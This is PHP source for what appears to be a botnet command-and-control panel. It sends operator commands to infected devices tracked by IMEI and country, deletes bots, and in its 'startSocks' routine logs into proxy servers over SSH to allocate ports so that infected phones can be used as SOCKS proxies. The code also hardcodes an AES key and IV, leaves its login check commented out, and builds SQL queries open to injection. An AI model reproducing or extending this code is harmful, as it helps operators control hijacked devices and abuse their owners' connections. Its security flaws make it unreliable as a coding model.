
<?php session_start();
include '../../db.php';
include '../../crypt.php';
include 'Net/SSH2.php';
include 'Crypt/AES.php';
/*if (!(isset($_SESSION['user_id']))){
	header("Location: ../index.php");  
	return;
} */ 
?>

<?php
$html = "";

function mb_stripos_all($haystack, $needle){
	$str = 0;
	$int = 0;
	$aStrPos = array();
	while(is_integer($int)){
	    $int = mb_strpos($haystack, $needle, $str);
	    //var_dump($int);
	    if (is_integer($int)) {
	        array_push($aStrPos, $int);
	        $str = $int + mb_strlen($needle);
	    }
	}
	if(count($aStrPos)) {
	    return $aStrPos;
	} else {
	    return false;
	}
}
function deCryptString($str=''){
   $str = base64_decode($str);
   $iv = 'kdpelsntnq;spfis';
   $key = 'QrzMwvH7zmVnMwSTWzyLJu#Ck!^f%-UvH7zmVn5Kzu%ks8GST';
   $cipher = new Crypt_AES(); 
   $cipher->setKey($key);
   $cipher->setIV($iv);
   $decrypted = $cipher->decrypt($str);
   return $decrypted;
}

//var_dump(allocatePort($mysqli, '7yV8j6jtFj5/rpTRkxFo3Q=='));

function allocatePort($mysqli, $id, $cmd, $imei){
	# get ssh parameters from db
	$get_ssh_by_id_sql = "SELECT * FROM `proxy_servers` WHERE `id` LIKE '$id'";
	$get_ssh_by_id_sql_res = $mysqli->query($get_ssh_by_id_sql);
	$server = mysqli_fetch_assoc($get_ssh_by_id_sql_res);
	$srv_ip = $server["ip"];
	$srv_id = $server["id"];
	$srv_user = $server["user"];
	$srv_pass = deCryptString($server["pass"]);
	//var_dump($srv_pass);
	$fwd_user = $server["forward_user"];
	$fwd_pass = $server["forward_pass"];
	
	# ssh to server and check port
	$ssh = new Net_SSH2($srv_ip);
    if (!$ssh->login($srv_user, $srv_pass)) {
    	# update server status
       $update_status_sql = "UPDATE `proxy_servers` SET `status` = '0', `status_text` = 'ssh connection is not happend' WHERE `id` = $id;";
	   $update_status_sql_res = $mysqli->query($update_status_sql);
       return false;
    }
    $rnd_port = $allocate_res = 1;
    $retry = 0;
    while((rtrim($allocate_res) != '0') and ($retry < 5)){
	    # get random port
	    $retry++;
		$rnd_port = rand(20000, 40000);
		var_dump($rnd_port);
	    $allocate_res = $ssh->exec("netstat -tln | grep $rnd_port && echo 1 || echo 0");
	    var_dump($allocate_res);
    }
    # create command
    $cmd = sprintf($cmd, $srv_ip, $rnd_port, $fwd_user, $fwd_pass);

    $get_country_sql = "SELECT country FROM `kliets` WHERE `IMEI` LIKE '$imei'";
	$get_country_sql_res = $mysqli->query($get_country_sql);
	$row = mysqli_fetch_assoc($get_country_sql_res);
	$bot_country = $row['country'];

    $add_connect_sql = "INSERT INTO `socks` (`id`, `IMEI`, `bot_country`, `server`, `port`, `connect_time`, `status`) VALUES (NULL, '$imei', '$bot_country', '$srv_id', '$rnd_port', '".time()."', '1');";
	$add_connect_sql_res = $mysqli->query($add_connect_sql);
	
	return $cmd;
}

function startCommand($mysqli){
	# get commands from DB
	$commands_array = [];
	$get_commands_sql = "SELECT * FROM `com_config` WHERE 1";
	foreach($mysqli->query($get_commands_sql) as $command_row) {
		$commands_array[$command_row["name"]] = $command_row["command"];
	}
	$command = $mysqli->real_escape_string($_POST['comboBox_commands']);
	if ($command != ''){
		$param1 = $mysqli->real_escape_string($_POST['param1']);
		$param2 = $mysqli->real_escape_string($_POST['param2']);
		$param3 = $mysqli->real_escape_string($_POST['param3']);
		$param4 = $mysqli->real_escape_string($_POST['param4']);
		$imeis_ = $mysqli->real_escape_string($_POST['text_imei']);
		$imeis_  = explode(':', $imeis_);

		$params_num = mb_stripos_all($commands_array[$command], '%s');
		//var_dump($params_num);
		foreach($imeis_ as $imei){
			if($imei !="" ){
				$command_ = $commands_array[$command];
				//var_dump($command_);
				#var_dump($params_num);
				if ($_POST['comboBox_commands'] == 'startSocks') $command_ = allocatePort($mysqli, $param1, $command_, $imei);
				if (count($params_num) == 1) $command_ = sprintf($command_, $param1);
				if (count($params_num) == 2) $command_ = sprintf($command_, $param1, $param2);
				if (count($params_num) == 3) $command_ = sprintf($command_, $param1, $param2, $param3);
				if (count($params_num) == 4) $command_ = sprintf($command_, $param1, $param2, $param3, $param4);
				
				$add_db_commands = $mysqli->query("INSERT INTO commands (IMEI,command, command_name) VALUE ('$imei','$command_', '$command')");
			}
		}
		if ($add_db_commands and $command_){
			$response = array("result" => "OK",
				"message" => "Command has been sended.",
				);
		} else {
			$response = array("result" => "ERROR",
				"message" => "Something went wrong...",
				);
		}
		echo json_encode($response);
	}
}

if (isset($_POST['comboBox_commands'])){
    $mysqli = new mysqli($db_host,$db_user,$db_pass,$db_name);
		startCommand($mysqli);
}

if (isset($_POST['ajax_command'])){
	if ($_POST['ajax_command'] == "delete"){}
		$ids_ = $_POST['checks'];
		$ids_  = explode(':', $ids_);
		foreach($ids_ as $id){
			if($id !="" ){
				$del_id_res = $mysqli->query($mysqli->real_escape_string("DELETE FROM `kliets` WHERE `id` = $id"));
				
			}
		}
		if ($del_id_res){
			$response = array("result" => "OK",
				"message" => "Bot(s) has been deleted.",
				);
		} else {
			$response = array("result" => "ERROR",
				"message" => "Something went wrong...",
				);
		}
		echo json_encode($response);
	}

?>